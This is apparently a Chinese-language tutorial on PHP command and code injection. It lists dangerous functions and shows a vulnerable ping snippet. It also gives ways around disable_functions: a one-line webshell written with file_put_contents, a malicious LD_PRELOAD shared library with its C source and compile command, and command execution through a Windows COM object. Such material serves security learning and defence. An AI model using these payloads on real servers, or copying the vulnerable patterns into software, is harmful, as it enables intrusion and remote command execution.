# 命令注入&代码注入


## 0x00 Introduction

## 0x01 危险函数
以下PHP函数若直接使用未过滤的用户输入，可能导致命令注入。

### 1. 执行系统命令
```
system("command");        // 直接输出结果
exec("command", $output); // 返回最后一行结果
passthru("command");      // 直接输出二进制数据
shell_exec("command");    // 返回字符串结果
`command`;                // 反引号等效于shell_exec
```

### 2.代码执行
```
eval()
assert()
create_function()（已弃用）
```

### 3.进程控制
```
proc_open()
popen()
```

### 4. 动态函数执行

用户自定义的函数可以导致代码执行。

```php
<?php
$dyn_func = $_GET["dyn_func"];
$argument = $_GET["argument"];
$dyn_func($argument);
?>
```

### 5. ${} 

PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。

```php
<?php
$var = "aaabbbccc ${`ls`}";
?>
```

```php
<?php
$foobar = "phpinfo";
${"foobar"}();
?>
```

### 6.回调函数

很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。

```
array_map()
call_user_func()
all_user_func_array ()
```

```php
<?php
$evil_callback = $_GET["callback"];
$some_array = array(0,1,2,3);
$new_array = array_map($evil_callback, $some_array);
?>
```

### 7. 其它潜在风险函数：
```
mail()           // 第五个参数可能注入Sendmail命令
preg_replace()   // 使用/e修饰符时可能执行代码（PHP <5.5）
```



## 0x02 漏洞代码

```php
// 漏洞代码（未过滤用户输入）
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```


## 0x03 防御绕过技巧 

### disable_functions 
在PHP安全中，disable_functions 是一种通过限制敏感函数调用来增强安全性的机制，但攻击者仍可能通过其他方式绕过这些限制。

在 php.ini 中配置 disable_functions，列出需要禁用的函数，例如：

```ini
disable_functions = system, exec, passthru, shell_exec, popen, proc_open
```
绕过 disable_functions 的常见方法:

#### 1. 利用未禁用的函数或扩展
- 文件操作函数
```php
// 通过写入Webshell间接执行命令
file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>');
```
- 反序列化漏洞   
通过反序列化触发 __destruct() 或 __wakeup() 中的危险操作。
#### 2. 利用环境变量注入（LD_PRELOAD）
原理：通过劫持共享库加载过程，在PHP子进程中执行恶意代码。    
利用：   
①编写恶意C代码：
```c
// evil.c
#include <stdlib.h>
#include <stdio.h>
void _init() {
    unsetenv("LD_PRELOAD");
    system("id > /tmp/exploit");
}
```
②编译为共享库：
```
gcc -shared -fPIC evil.c -o evil.so
```
③通过PHP触发加载：

```
putenv("LD_PRELOAD=/path/to/evil.so");
```
#### 3. 利用PHP扩展漏洞
- PHP-FPM未授权访问：通过构造FastCGI协议执行命令。
- PHP COM组件（Windows）：调用Windows COM对象。
```php
$wsh = new COM("WScript.Shell");
$wsh->Run("cmd.exe /c whoami");
```
